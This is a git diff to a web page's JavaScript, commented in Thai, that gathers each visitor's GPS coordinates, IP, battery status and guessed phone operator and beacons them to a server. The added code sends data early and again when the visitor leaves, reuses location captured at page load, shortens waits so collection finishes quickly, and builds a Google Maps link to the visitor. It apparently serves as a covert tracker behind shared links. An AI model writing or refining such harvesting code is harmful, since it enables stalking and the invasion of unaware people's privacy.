@@ -93,6 +93,62 @@ function getUrlParameters() {
     phoneInfo: { possibleOperator: "กำลังตรวจสอบ..." } // Placeholder for phone
   };
 
+  // --- เริ่มต้นส่งข้อมูลเบื้องต้นก่อน (ส่งข้อมูลที่ได้ทันที) ---
+  // นำเข้าข้อมูล GPS ที่เก็บไว้ล่วงหน้าจาก index.html (ถ้ามี)
+  if (window.earlyCapturedLocation) {
+    console.log("พบข้อมูล GPS ที่เก็บไว้ล่วงหน้า:", window.earlyCapturedLocation);
+    
+    // ตรวจสอบว่ามีข้อมูล error หรือไม่
+    if (window.earlyCapturedLocation.error) {
+      dataToSend.location = `ไม่สามารถระบุได้ (${window.earlyCapturedLocation.message})`;
+    } else {
+      // ใช้ข้อมูล GPS ที่มีอยู่แล้ว
+      dataToSend.location = {
+        lat: window.earlyCapturedLocation.lat,
+        long: window.earlyCapturedLocation.long,
+        accuracy: window.earlyCapturedLocation.accuracy,
+        source: 'early-capture',
+        captureTime: window.earlyCapturedLocation.captureTime
+      };
+    }
+  }
+  
+  // ตรวจสอบว่าอยู่ในโหมด early send หรือไม่ (โหมดส่งข้อมูลเร็ว)
+  const enableEarlySend = true;
+  
+  if (enableEarlySend) {
+    console.log("โหมดส่งข้อมูลเร็ว: กำลังส่งข้อมูลเบื้องต้นก่อนได้ข้อมูลครบ");
+    // ส่งข้อมูลเบื้องต้นก่อนที่จะได้ข้อมูลทั้งหมด
+    // ใช้ requestId เดียวกัน แต่เพิ่ม suffix เพื่อให้รู้ว่าเป็นการส่งข้อมูลเบื้องต้น
+    const earlyDataToSend = {
+      ...dataToSend,
+      requestId: requestId + "-early",
+      isEarlyData: true,
+      timestamp: timestamp
+    };
+    
+    // เรียกฟังก์ชัน sendBeacon เพื่อส่งข้อมูลเบื้องต้น
+    sendDataWithBeacon(earlyDataToSend);
+  }
+
+  // สร้างฟังก์ชันสำหรับส่งข้อมูลที่มีอยู่เมื่อผู้ใช้กำลังออกจากหน้าเว็บ
+  window.sendBeaconWithAvailableData = function() {
+    console.log("ผู้ใช้กำลังออกจากหน้าเว็บ: ส่งข้อมูลที่มีอยู่ขณะนี้");
+    // ส่งข้อมูลที่มีอยู่ขณะนี้ด้วย beacon API
+    const exitData = {
+      ...dataToSend,
+      requestId: requestId + "-exit",
+      isExitData: true,
+      exitTimestamp: new Date().toLocaleString('th-TH', {
+        timeZone: 'Asia/Bangkok',
+        year: 'numeric', month: '2-digit', day: '2-digit',
+        hour: '2-digit', minute: '2-digit', second: '2-digit'
+      })
+    };
+    
+    sendDataWithBeacon(exitData);
+  };
+
   // --- เริ่มรวบรวมข้อมูลแบบ Asynchronous ---
 
   // 1. Battery Info
@@ -122,67 +178,94 @@ function getUrlParameters() {
     dataToSend.phoneInfo = { possibleOperator: "ข้อผิดพลาด" };
   });
 
-  // 4. Geolocation
+  // 4. Geolocation - ปรับปรุงการเรียกใช้ geolocation API
   let locationPromise;
   if (navigator.geolocation) {
-    console.log("Requesting geolocation...");
-    locationPromise = new Promise((resolve) => {
-      navigator.geolocation.getCurrentPosition(
-        position => {
-          console.log("Geolocation success:", position.coords);
-          resolve({
-            lat: position.coords.latitude,
-            long: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            // สร้าง Link ภายใน Google Apps Script จะดีกว่า เพื่อความยืดหยุ่น
-            // gmapLink: `https://www.google.com/maps?q=$${position.coords.latitude},${position.coords.longitude}`
-          });
-        },
-        error => {
-          console.error(`Geolocation error: ${error.message} (Code: ${error.code})`);
-          resolve("ไม่มีข้อมูล"); // ส่ง "ไม่มีข้อมูล" เมื่อเกิดข้อผิดพลาด
-        },
-        {
-          timeout: 15000, // 15 วินาที
-          enableHighAccuracy: true,
-          maximumAge: 0 // ขอข้อมูลใหม่เสมอ
-        }
-      );
-    }).then(location => {
-        dataToSend.location = location;
-    }).catch(() => {
-        // Handle potential errors within the promise chain if needed, though resolve("ไม่มีข้อมูล") covers most cases
-        dataToSend.location = "ข้อผิดพลาดในการขอตำแหน่ง";
-    });
-
-    // เพิ่ม Timeout สำหรับ Geolocation โดยรวม
-    locationPromise = Promise.race([
-        locationPromise,
-        new Promise(resolve => setTimeout(() => {
-            if (dataToSend.location === "กำลังตรวจสอบ...") { // ถ้ายังไม่ได้ผลลัพธ์
-                 console.warn("Geolocation request timed out after 15 seconds.");
-                 dataToSend.location = "ไม่มีข้อมูล (Timeout)";
-            }
-            resolve(); // Resolve race promise
-        }, 15000))
-    ]);
-
+    // ตรวจสอบว่ามีข้อมูล GPS จาก early capture หรือไม่
+    if (window.earlyCapturedLocation && !window.earlyCapturedLocation.error) {
+      // ถ้ามีข้อมูล GPS จาก early capture แล้ว ให้ใช้ข้อมูลนั้นเลย
+      locationPromise = Promise.resolve(window.earlyCapturedLocation);
+      console.log("ใช้ข้อมูล GPS ที่เก็บไว้ล่วงหน้า ไม่ต้องเรียก API อีก");
+    } else {
+      console.log("เริ่มขอข้อมูล GPS จาก script.js");
+      locationPromise = new Promise((resolve, reject) => {
+        const geoStartTime = Date.now();
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            const geoData = {
+              lat: position.coords.latitude,
+              long: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              source: 'main-script', 
+              captureTime: Date.now() - geoStartTime + 'ms'
+            };
+            console.log("ได้รับข้อมูล GPS จาก script.js:", geoData);
+            resolve(geoData);
+          },
+          error => {
+            console.warn("ไม่สามารถดึงข้อมูล GPS ได้:", error.message);
+            reject(error);
+          },
+          { 
+            enableHighAccuracy: false, // ลดเหลือ false เพื่อให้ได้ข้อมูลเร็วขึ้น
+            timeout: 5000,            // ลดเวลา timeout เหลือ 5 วินาที
+            maximumAge: 30000         // ยอมรับข้อมูลเก่าได้ 30 วินาที
+          }
+        );
+      });
+    }
   } else {
-    // ถ้าไม่รองรับ Geolocation
-    console.warn("Geolocation API is not supported in this browser.");
-    dataToSend.location = "ไม่รองรับ";
-    locationPromise = Promise.resolve(); // สร้าง Promise ที่ resolve ทันที
+    locationPromise = Promise.reject(new Error("เบราว์เซอร์ไม่สนับสนุน Geolocation"));
   }
+  
+  // เมื่อได้ข้อมูล GPS แล้วให้อัพเดทในตัวแปร dataToSend
+  locationPromise.then(locationData => {
+    console.log("อัพเดทข้อมูล GPS ใน dataToSend:", locationData);
+    dataToSend.location = locationData;
+    
+    // สร้าง Google Maps Link
+    if (locationData.lat && locationData.long) {
+      locationData.gmapLink = `https://www.google.com/maps?q=${locationData.lat},${locationData.long}`;
+    }
+  }).catch(error => {
+    console.error("เกิดข้อผิดพลาดในการดึงข้อมูล GPS:", error);
+    dataToSend.location = `ไม่สามารถระบุได้ (${error.message})`;
+  });
 
   // --- รอข้อมูล Asynchronous ทั้งหมด แล้วส่งข้อมูล ---
-  Promise.allSettled([batteryPromise, ipPromise, phonePromise, locationPromise])
-    .then(() => {
-      // ณ จุดนี้ ข้อมูลทั้งหมด (หรือสถานะข้อผิดพลาด) ควรจะอยู่ใน dataToSend แล้ว
-      console.log("All async data collected (or timed out/error). Final data:", JSON.stringify(dataToSend));
-
-      // ส่งข้อมูลทั้งหมดโดยใช้ sendBeacon
-      sendDataWithBeacon(dataToSend);
-    });
+  // ลดเวลารอ Promise.allSettled ลงเพื่อให้ได้ข้อมูลเร็วขึ้น
+  const dataCollectionTimeout = 3000; // ลดเหลือ 3 วินาที
+  
+  // สร้าง timeout promise เพื่อป้องกันการรอนานเกินไป
+  const timeoutPromise = new Promise(resolve => {
+    setTimeout(() => {
+      console.log(`เกินเวลาที่กำหนด ${dataCollectionTimeout}ms - ส่งข้อมูลที่มี`);
+      resolve({status: 'timeout'});
+    }, dataCollectionTimeout);
+  });
+  
+  // ใช้ Promise.race แทน Promise.allSettled เพื่อส่งข้อมูลเมื่อครบเวลาหรือได้ข้อมูลครบ
+  Promise.race([
+    Promise.allSettled([batteryPromise, ipPromise, phonePromise, locationPromise]),
+    timeoutPromise
+  ]).then(() => {
+    console.log("ส่งข้อมูลหลักไปยัง server");
+    console.log("Final data to send:", dataToSend);
+    
+    // เพิ่มเวลาที่ใช้ในการเก็บข้อมูลทั้งหมด
+    dataToSend.collectionDuration = `${Date.now() - window.gpsRequestStartTime || 0}ms`;
+    
+    // ส่งข้อมูลไปยัง server
+    sendDataWithBeacon(dataToSend);
+    
+    // บันทึกใน sessionStorage ว่าได้ส่งแล้ว
+    const sentKey = `sent_${dataToSend.requestId}`;
+    try {
+      sessionStorage.setItem(sentKey, 'sent');
+    } catch (e) {
+      console.warn("ไม่สามารถบันทึกใน sessionStorage:", e);
+    }
+  });
 
 })(); // End of main IIFE
 
